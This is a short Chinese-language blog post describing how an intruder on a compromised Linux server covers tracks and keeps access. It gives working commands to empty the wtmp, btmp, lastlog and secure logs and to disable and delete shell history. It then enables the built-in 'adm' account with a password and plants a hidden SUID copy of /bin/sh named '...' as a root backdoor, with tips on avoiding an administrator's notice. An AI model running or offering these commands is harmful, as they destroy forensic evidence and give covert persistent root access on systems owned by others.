---
layout: post
title: linux操作：清理入侵日志和维持权限
date: 2019-12-20
categories: blog
tags: [linux，清理入侵日志和维持权限]
description: linux，清理入侵日志和维持权限
---

#### 一、环境
- 在获取liunx服务器权限之后，操作完之后需要清除入侵的痕迹和维持权限

#### 二、日志部分
- 清除登录ssh登录日志、安全日志、last、lastb等
```shell
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
```
- history删除
```shell
 set +o history (最前面有空格)，输入该命令后，在当前终端，之后输入的所有命令都不会被history记录（防止搞到一半被管理员断网，记录留下）
 history -c 输入该命令之后，当前终端所有输过的命令不会被记录到history（一般这个就够了）
 rm -rf ~/.bash_history 删除history，意思之前管理员记录的history也没了，有的管理员有查看history的习惯，这条慎用
```

#### 三、suid提权
- 激活adm用户（linux自带很多无用用户，如adm，mail）
```shell
usermod -s /bin/bash adm
echo "password"|passwd --stdin adm
```
- suid提权，把sh复制重命名为...，放在其他文件夹，加s权限，重命名为...是为了不被发现,ls看不到，ls -la一般人也看不出
```shell
cp /bin/sh /usr/share/...
chmod a+s /usr/share/...
```
- 使用时以adm ssh登录，然后./usr/share/...就是root权限了






